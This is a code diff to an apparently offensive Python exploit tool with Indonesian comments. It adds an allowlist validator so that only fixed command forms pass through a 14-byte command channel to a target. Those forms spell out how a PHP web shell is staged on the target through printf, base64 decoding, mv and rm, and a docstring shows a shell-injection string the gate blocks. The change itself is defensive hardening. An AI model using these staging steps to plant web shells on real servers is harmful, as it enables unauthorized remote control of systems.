@@ -99,6 +99,50 @@ def validate_name(name: str) -> str:
     return name
 
 
+# ------------------------------------------------------------------ RR-2 ---
+# Bentuk perintah yang SAH di carrier 14 byte. Semua bentuk di bawah dibangun
+# modul ini sendiri dari input tervalidasi; tidak ada satu pun yang menerima
+# string bebas dari operator.
+#
+# Kenapa tidak memakai `exploit_runner.validate_command()`: perintah carrier
+# memang memuat `>`, `<`, dan `rm ` — token yang sengaja dilarang di jalur
+# proof-of-access. Dua jalur ini punya kebutuhan berbeda, jadi pagarnya juga
+# berbeda; yang WAJIB sama adalah sifatnya: allowlist bentuk, bukan blacklist.
+_CARRIER_FORMS = (
+    # tulis staging: printf '<char>' >v  /  printf '<char>' >>v
+    (re.compile(r"printf '([A-Za-z0-9+/=])' >>?v\Z"), "printf char ke staging 'v'"),
+    # decode staging -> g
+    (re.compile(r"base64 -d<v>g\Z"), "base64 -d<v>g"),
+    # pasang shell: mv g <nama tervalidasi>
+    (re.compile(r"mv g [A-Za-z0-9][A-Za-z0-9._-]{0,31}\.php\Z"), "mv g <nama>"),
+    # bersihkan: rm v / rm g / rm <nama tervalidasi>
+    (re.compile(r"rm (v|g|[A-Za-z0-9][A-Za-z0-9._-]{0,31}\.php)\Z"), "rm <artefak>"),
+)
+
+
+def validate_carrier_cmd(cmd: str) -> str:
+    """Alasan penolakan bila `cmd` bukan bentuk carrier yang sah ('' = sah).
+
+    Dipakai `full_chain_cmd()` sebagai satu-satunya gerbang: perintah yang
+    tidak cocok salah satu `_CARRIER_FORMS` tidak pernah sampai ke target.
+    Batas 14 byte tetap diperiksa (batas fisik carrier), tetapi bukan lagi
+    satu-satunya penjaga.
+    """
+    if not isinstance(cmd, str) or not cmd:
+        return "ditolak: perintah carrier kosong"
+    if len(cmd.encode()) > CARRIER_MAX:
+        return (f"ditolak: perintah {cmd!r} = {len(cmd.encode())} byte > "
+                f"carrier {CARRIER_MAX} byte; perintah ini tidak akan sampai "
+                f"ke target")
+    for pattern, label in _CARRIER_FORMS:
+        if pattern.fullmatch(cmd):
+            return ""
+    return (f"ditolak: perintah {cmd!r} bukan bentuk carrier yang diizinkan "
+            f"({', '.join(label for _p, label in _CARRIER_FORMS)}) — jalur ini "
+            f"hanya menjalankan langkah yang dibangun modul sendiri, bukan "
+            f"string bebas")
+
+
 def carrier_check(name: str) -> None:
     """Pastikan `mv g <name>` dan `rm <name>` muat di carrier 14 byte.
 
@@ -193,8 +237,22 @@ def http_post(url: str, data: dict, timeout: float = 8.0) -> tuple[int, str]:
 
 def full_chain_cmd(base: str, cmd: str, profile: str = "bookworm",
                    attempts: int = 6, log=print) -> bool:
-    """Eksekusi 1 perintah (<=14 byte) — leak BARU per perintah, pola run_exploit."""
-    assert len(cmd.encode()) <= 14, (len(cmd), cmd)
+    """Eksekusi 1 perintah (<=14 byte) — leak BARU per perintah, pola run_exploit.
+
+    RR-2 (audit round 2): jalur ini membangun perintah yang MEMANG melanggar
+    `exploit_runner.FORBIDDEN_CMD_TOKENS` (`>`, `<`, `rm `), jadi tidak mungkin
+    lewat `validate_command()` — dan karena itu tidak boleh menerima string
+    bebas dari luar. Gerbangnya di sini: `cmd` wajib cocok salah satu BENTUK di
+    `_CARRIER_FORMS`, semuanya dibangun oleh modul ini sendiri dari input yang
+    sudah divalidasi (nama shell via `validate_name()`, char base64, dst).
+
+    Tanpa gerbang ini, siapa pun yang memanggil `full_chain_cmd(base,
+    "sh</out/c")` mendapat eksekusi string bebas di target — persis kelas bug
+    yang ditutup R2-01 di jalur exploit, tetapi di jalur yang berbeda.
+    """
+    why = validate_carrier_cmd(cmd)
+    if why:
+        raise ValueError(why)
     for attempt in range(1, attempts + 1):
         try:
             t = chain_mod.Target(base, timeout=30.0, verbose=False)
